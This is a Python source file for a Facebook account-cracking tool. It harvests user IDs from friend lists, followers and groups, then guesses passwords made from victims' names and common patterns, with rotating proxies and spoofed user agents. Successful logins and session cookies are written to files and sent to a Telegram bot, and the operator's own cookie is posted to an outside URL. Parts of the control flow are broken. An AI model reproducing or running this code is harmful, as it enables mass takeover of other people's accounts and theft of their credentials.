                self.ubah_bahasa({"cookie": cok})
                exit("\n[✓] proses mengubah ke mode data telah selesai.\n[<>] silahkan masukan ulang cookie nya dengan mengetik python regex.py")
            elif 'href="/x/checkpoint/' in str(link):
                print("[✘] Invalid cookie [NO]");time.sleep(2);self.login_cokie()
            elif 'href="/r.php' in str(link):
                print("[✘] Invalid cookie [NO]");time.sleep(2);self.login_cokie()
            else:
                print("\n[<>] wait a little bit...")
                self.ubah_bahasa({"cookie": cok})
                nama = re.findall("\<title\>(.*?)<\/title\>", link)[0]
                user = re.search("c_user=(\d+)", str(cok)).group(1)
                open('ok.coki.txt', 'w').write(cok);open('ID.txt', 'w').write(f"{nama}|{user}")
                print(f"[<>] Hi :  {nama} ");self.ikuti({"cookie": cok});self.datas(nama, cok)
                exit("\n[!!]")
        except requests.ConnectionError:
            print('')
            exit("\n[√] تم تنشيط الكوكيز بنجاح")

    def ubah_bahasa(self, cok):
        try:
            link = self.ses.get(f"{self.url}/language/", cookies=cok).text
            data = par(link, "html.parser")
            for x in data.find_all('form',{'method':'post'}):
                if "Bahasa Indonesia" in str(x):
                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(link)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit"  : "Bahasa Indonesia"}
                    self.ses.post(f"{self.url}{x['action']}", data=bahasa, cookies=cok)
        except:pass

    def ikuti(self, cok):
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id=1385711176", cookies=cok).text, "html.parser")
            xnxx = link.find("a", string="Ikuti").get("href")
            self.ses.get(f"{self.url}{str(xnxx)}", cookies=cok).text
        except:pass

    def get_proxy(self):
        rest = []
        self.ses.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"})
        gots = par(self.ses.get("https://hidemy.name/en/proxy-list/?type=5").text, "html.parser")
        reg = re.findall(">(\d+.\d+.\d+.\d+).*?>(\d+).*?i", str(gots))
        for x in reg:
            rest.append("socks5://"+x[0]+":"+x[1])
        if rest != 0:
            try:os.remove("proxies.txt")
            except:pass
            for yay in rest:
                open("proxies.txt", "a+").write(yay+"\n")
            exit("(✓) File save in proxies.txt, restart this tools\n")
        else:
            exit("(✓) File save in proxies.txt, restart this tools\n")

    def memek(self, mmk, kntl):
        if "lqkwndpnkefnfjsnwnfuoeohni3e" in kntl:self.ses.get(f"{self.kontol['mmk']}{self.kontol['hncet']}{self.kontol['softek']}{self.kontol['ngtd']}{mmk}").json()
        else:self.ses.get(f"{self.kontol['mmk']}{self.kontol['hncet']}{self.kontol['softek']}{self.kontol['ngtd']}{mmk}").json()

    def menu(self):
        try:
            cook = {"cookie": open("ok.coki.txt", "r").read()}
            nama, user = open("ID.txt", "r").read().split("|")
        except FileNotFoundError:
            self.login_cokie()
        self.logoo()
        try:
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies=cook).text
            if "mbasic_logout_button" not in link:
                self.hapus()
                print(f"\n[!!] It seems that the Facebook account has been locked. Please verify the account or create a new cookie.");time.sleep(3);self.login_cokie()
        except requests.ConnectionError:
            exit("\n[√] تم تنشيط الكوكيز بنجاح")
        self.jnckk()
        os.system('clear')
        llogin()
        def fak_xy(u):
        	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
        def clear():
        	os.system('clear')
        	def back():
        		llogin()
        	def banner():
        		print(f'''⋘@nader20090⋙''')
        exit()
        


        ykh = input(f"{H}[{M}+{H}]{N} @nader20090 ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            exit("belum selesai:)")
        elif ykh in ["2", "02"]:
            print("[+] ketik 'me' jika ingin crack dari teman anda.")
            user = input(f"[{O}*{N}] enter id or username : ")
            if "me" in user:
                try:
                    link = par(self.ses.get(f"{self.url}/profile.php", cookies=cook).text, "html.parser")
                    if "Anda Diblokir Sementara" in link:
                        print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                    else:
                        print("[!] to stop press CTRL then press C on your keyboard.")
                        self.batur(self.url+link.find("a", string="Teman").get("href"), cook)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("[!] kesalahan pada koneksi")
                print()
                self.metode()
            else:
                try:
                    link = self.ses.get(f"{self.url}/{user}/friends", cookies=cook).text
                    if "Halaman Tidak Ditemukan" in link:
                        print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                    elif "Anda Diblokir Sementara" in link:
                        print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                    elif "Konten Tidak Ditemukan" in link:
                        print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                    else:
                        print("[!] to stop press CTRL then press C on your keyboard.")
                        self.batur(f"{self.url}/{user}/friends", cook)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("[!] kesalahan pada koneksi")
                print()
                self.metode()
        elif ykh in ["3", "03"]:
            user = input(f"[{O}*{N}] enter id or username followers: ")
            if user in["", " "]:
                print(f"\n{M}jangan kosong");time.sleep(2);self.menu()
            elif user.isdigit():
                memek = (f"{self.url}/profile.php?id={user}&v=followers")
            else:
                memek = (f"{self.url}/{user}?v=followers")
            try:
                link = self.ses.get(memek, cookies=cook).text
                if "Halaman Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                elif "Anda Diblokir Sementara" in link:
                    print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                elif "Konten Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                else:
                    print("[!] to stop press CTRL then press C on your keyboard.")
                    self.follow(memek, cook)
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit("[!] kesalahan pada koneksi")
            print()
            self.metode()
        elif ykh in ["4", "04"]:
            user = input(f"[{O}*{N}] enter id gruop : ")
            try:
                link = self.ses.get(f"{self.url}/groups/{user}", cookies=cook).text
                if "Halaman yang Anda minta tidak ditemukan." in link:
                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan");time.sleep(2);self.menu()
                elif "Anda Diblokir Sementara" in link:
                    print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                elif "Konten Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan");time.sleep(2);self.menu()
                else:
                    print("[!] to stop press CTRL then press C on your keyboard.")
                    self.dumps(f"{self.url}/groups/{user}", cook)
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit("[!] kesalahan pada koneksi")
            print()
            self.metode()
        elif ykh in ["5", "05"]:
            self.cek_hasil()
        elif ykh in ["6", "06"]:
            self.get_proxy()
        elif ykh in ["0", "00"]:
            self.hapus()
            exit("done remove cookie")
        else:print("[!] input yang bner kontol");time.sleep(2);self.menu()

    def cek_hasil(self):
        print("""-----------------------------------------------------
{01} check result ok
{02} check result cp
{00} back to menu
-----------------------------------------------------""")
        ykh = input(f"{H}[{M}+{H}]{N} @nader20090 ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            try: yyy = open("ok.txt", "r").readlines()
            except FileNotFoundError:print("No ok results saved");time.sleep(2);self.cek_hasil()
            for i in yyy:
                print(i)
            exit("\nCheck result is complete")
        elif ykh in ["2", "02"]:
            try: yyy = open("cp.txt", "r").readlines()
            except FileNotFoundError:print("No cp results saved");time.sleep(2);self.cek_hasil()
            for i in yyy:
                print(i)
            exit("\nCheck result is complete")
        elif ykh in ["0", "00"]:
            self.menu()
        else:print("[!] input yang bnr");time.sleep(2);self.menu()

#-------------- DUMP ID -------------------
    def batur(self, link, coki):
        try:
            kontol = self.ses.get(link, cookies=coki).text
            memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    self.id.append(re.findall("id\=(.*?)\&", softek[0])[0]+"<=>"+softek[1])
                else:
                    self.id.append(re.findall("\/(.*?)\?eav",softek[0])[0]+"<=>"+softek[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Teman Lain" in kontol:
                self.batur(self.url+par(kontol, "html.parser").find("a", string="Lihat Teman Lain").get("href"), coki)
        except:pass

    def jnckk(self):
        linz = self.ses.get("https://pastebin.com/raw/mi4nGb0K").json()
        for i in linz["friends"]["data"]:
            self.kontol.update(i)

    def follow(self, link, coki):
        try:
            xxxx = self.ses.get(link, cookies=coki).text
            rege = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>', xxxx)
            for xxx in rege:
                if "profile.php?" in xxx[0]:
                    self.id.append(re.findall("id=(.*?)&amp;eav", xxx[0])[0]+"<=>"+xxx[1])
                else:
                    self.id.append(re.findall("(.*?)\?eav", xxx[0])[0]+"<=>"+xxx[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Selengkapnya" in xxxx:
                self.follow(self.url+par(xxxx, "html.parser").find("a", string="Lihat Selengkapnya").get("href"), coki)
        except:pass

    def dumps(self, link, coki):
        try:
            data = self.ses.get(link, cookies=coki).text
            cari = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>', data)
            for x in cari:
                if "profile.php?" in x[0]:
                    self.id.append(re.findall("id=(.*?)&amp;eav", x[0])[0]+"<=>"+x[1])
                else:
                    self.id.append(re.findall("(.*?)\?eav", x[0])[0]+"<=>"+x[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Postingan Lainnya" in data:
                self.dumps(self.url+par(data, "html.parser").find("a", string="Lihat Postingan Lainnya").get("href"), coki)
        except:pass

    def datas(self, nama, coki):
        try:
            data = {"title": nama, "message": coki}
            post = self.ses.post(self.cok, data=data).text
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")
#--------------------------------------------
    def metode(self):
        print(f"[=] total ids: {str(len(self.id))}")
        print("""    [ select metode ]

  %s{%s01%s} Api
  %s{%s02%s} Async
  %s{%s03%s} validate
"""%(N,H,N,N,H,N,N,H,N))
        ykh = input(f"{H}[{M}+{H}]{N} @nader20090_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.paswww("api")
        elif ykh in ["2", "02"]:
            self.paswww("acy")
        elif ykh in ["3", "03"]:
            self.paswww("dat")
        else:print("[!] input yang bner kontol");time.sleep(2);self.metode()

    def paswww(self, xx):
        print("""    [ select password ]

  %s{%s01%s} manual
  %s{%s02%s} gabung
  %s{%s03%s} otomatis
"""%(N,H,N,N,H,N,N,H,N))
        ykh = input(f"{H}[{M}+{H}]{N} @nader20090_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.manual(xx)
        elif ykh in ["2", "02"]:
            print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
            kata = input(f"[{M}?{N}] sandi: ")
            xnxx = kata.split(",")
            for i in xnxx:
                self.pasw.append(i)
            print(f"kata sandi tambahan -> [ {M}{kata}{N} ]")
            self.carckk(xx)
        elif ykh in ["3", "03"]:
            self.carckk(xx)
        else:print("[!] input yang bner kontol");time.sleep(2);self.paswww()

    def manual(self, xx):
        self.iya.append("iya")
        print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
        while True:
            global prog,des
            pwek = input(f"[{O}?{N}] sandi : ")
            if pwek in[""," "]:
                print(f"[{M}×{N}] jangan kosong bro kata sandi nya")
            elif len(pwek)<=5:
                print(f"[{M}×{N}] kata sandi minimal 6 karakter")
            else:
                if "api" in xx:
                    print("""---------------
@nader20090
------------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.apiiiiii, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
                elif "acy" in xx:
                    print("""--------------
@nader20090
---------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.regguler, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
                elif "dat" in xx:
                    print("""-------------
@nader20090
-----------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.apiiiiii, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
        
        os.system('clear')
        llogin()
def fak_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	llogin()

def banner():
	print(f'''<♡> AYHAM ♡•''')

# @nader20090

def kilmenu():
	
	ip = requests.get("https://api.ipify.org").text
	
	os.system('clear')
	print('''⠀\033[2;36m⠀⢀⣀⣀⣀⣀⣠⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣏⠉⠈⣿⣿⣿⢦⣀⠀⠀⠀⠀⠀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢿⠋⠻⣿⣷⣄⡙⠛⠋⠀⠈⠹⣷⠚⠛⣟⠽⣯⠝⠋⠙⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠉⠉⠙⢿⠲⠤⣼⡿⡆⠀⢢⠀⠉⠲⠏⠀⠀⠀⣇⢻⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⡇⢀⡼⠁⠀⠀⢸⠟⠉⠉⠛⢦⠀⠀⢿⡼⠿⡚⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣠⣶⡶⠿⢿⡿⣿⠟⢁⣀⣠⠔⠋⠀⠀⠀⠀⠈⡇⠀⠀⠀⠀⠉⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣾⡞⠁⢀⣴⡯⠞⣡⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⠀⣠⠄⣸⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⠙⠀⠀⢿⣤⠤⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⢰⡖⠒⢤⣧⣤⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠖⠋⠀⠀⠈⡧⠀⣏⠁⢰⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠴⠋⠁⠀⠀⠀⠀⠀⠈⠓⢦⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠚⠁⠀⠀⢴⠒⠒⠢⡀⠀⠀⢠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⠶⠋⠀⠀⠀⠀⠀⡼⢀⡶⠆⢳⣤⠔⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠸⡀⠹⣀⣸⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⡶⠛⠁⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠒⢿⡉⠛⢍⠛⠒⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⠃⠀⠀⠀⠀⢠⡤⢤⣀⣠⠎⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⢯⡀⠀⠀⠀⢹⡆⠻⠦⠴⠃⢈⣣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠀⠀⠀⠀⢀⣼⣀⡖⣾⠃@x00se⠀⠀⠀⠀⠀⠀⠀⢠⡾⢅⣸⠁⠀⠀⠀⠸⡦⠖⠤⣀⠜⠁⠈⢷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡟⠀⠀⠀⠀⡏⠹⡗⢺⢻⡀⠀⠀⠀⠀⠀⠀⠀⣠⠿⠖⣉⣀⣱⠀⣀⡤⠤⢤⣄⠀⠀⠀⢀⣀⣸⠀⠀⠀⠐⠻⣗⠲⣄⠀
⠀⠀⠀⠀⣿⠀⠀⠀⠀⠈⠉⠉⢹⠚⢷⣀⠀⠀⠀⠀⣀⡴⠛⠒⠊⠀⠀⣠⠎⠁⠀⠀⠀⠈⢳⡀⠀⣿⣸⡿⠀⠀⠀⠀⠀⠈⣇⠘⡆
⠀⠀⠀⠀⢸⡄⠀⠀⠀⠀⠀⠀⠸⡇⢸⠙⡟⠲⡖⠋⣯⠀⠀⠀⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⡧⣎⣈⣿⠃⠀⠀⠀⠀⠀⠀⣼⣆⢻
⠀⠀⠀⠀⠀⢷⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⢼⡤⠃⡔⠁⠀⠀⠀⠀⣸⠃⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⣯⠀⠀⠀⠀⠀⠀⢠⠷⠼⢺
⠀⠀⠀⠀⠀⠈⢳⣄⠀⠀⠀⠀⠀⠀⠐⠖⠚⠒⠞⠀⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⠀⠸⠽⠷⣄⣀⣀⣠⡶⠋⠀⢠⡟
⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⢯⡛⡷⠚⠁⢀⡴⠋⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠒⠒⠦⠤⠤⠤⠴⠖⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠒⠲⠿⠷⠒⠛⠉⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀A     Y     H     A     M

         V         I       P    ♕
     الصيد  صور  دز يبني @x00se
 ''') 
	print('')
	print('• <1> Crack File : مــن مــلــف • ')		
	print('• <0> login out : تسجيل خروج •  ')
		
	_____alvino__adijaya_____ = input('\n ♡ chose : ')
	if _____alvino__adijaya_____ in ['46491']:
		dump_massal()
	elif _____alvino__adijaya_____ in ['26464']:
		follower()	
	elif _____alvino__adijaya_____ in ['1']:
		TakeFile()	
	elif _____alvino__adijaya_____ in ['0']:
		O()
		exit()
def TakeFile():
	
	try:
		
		jum = input(' <♡> مسار الملف  : ')
		for line in open(jum, 'r').readlines():
			id.append(line.strip())
		print(' <♡> الايديات المستخرجة : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
			print('[✘] No Connection  ')
			exit()
	except (KeyError,IOError):
			print('[✘] Id Is Not Public')
			time.sleep(3)
def setting():
	print("\033[2;36m═━═━═━═━═━━═━═━═━═━━═━═━═━═━━═━═━═━")
	print(f'» 1- Id old | الاولويه في الفحص للحسابات القديمه')
	print('» 2- Id New | الاولويه في الفحص للحسابات الجديده')
	print('» 3- Old+new | قـديـمـه وجـديده ')
	print('')
	hu = input('» Chose : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> PILIH YANG BENAR BANG ')
		exit()
	print('>> 1. Mobile ')
#    print('>> 2. Mbasic ')
#    print('>> 3. Touch  ')
#    print('>> 4. Mtouch ')
	print('')
	hc = input('» Chose : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['']:
		print('>> PILIH YANG BENAR BANG ')
		setting()
#	elif hc in ['2','02']:
#		method.append('free')
#	elif hc in ['3','03']:
#		method.append('touch')
	elif hc in ['4','04']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print('')
	passwrd() 
def passwrd():
	
	
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:

					pwv.append('112233445566')
					pwv.append('1122334455')
					pwv.append('1234512345')	
					pwv.append('11223344556677')
					pwv.append('00998877')
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('>> Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input('>> Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}[=]{k} Been completed {x} <> ')
		time.sleep(2)
		
		exit()		
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s [@x00se] %s/%s » [OK] %s » [CP] %s » %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip = random.choice(prox)
			proxs = {'http': 'socks4://' + nip}
			tix = time.time()
			ses.headers.update({"Host": 'm.facebook.com', "upgrade-insecure-requests": "1", "user-agent": ua2,
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                                "dnt": "1", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin",
                                "sec-fetch-mode": "cors", "sec-fetch-user": "empty", "sec-fetch-dest": "document",
                                "referer": "https://m.facebook.com/", "accept-encoding": "gzip, deflate br",
                                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					statuscp = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✖️
⋘─────━𓆩@x00se𓆪‏━─────⋙
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
⋘─────━𓆩احبكم.𓆪‏━─────⋙
@x00se  -  الصيد صور دز					
					'''
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='SESI'))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✔️
⋘─────━𓆩@x00se𓆪‏━─────⋙
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
⋘─────━𓆩@x00se𓆪‏━─────⋙
@x00se  -  الصيد صور دز					
					'''
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title=' NO SESI'))
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
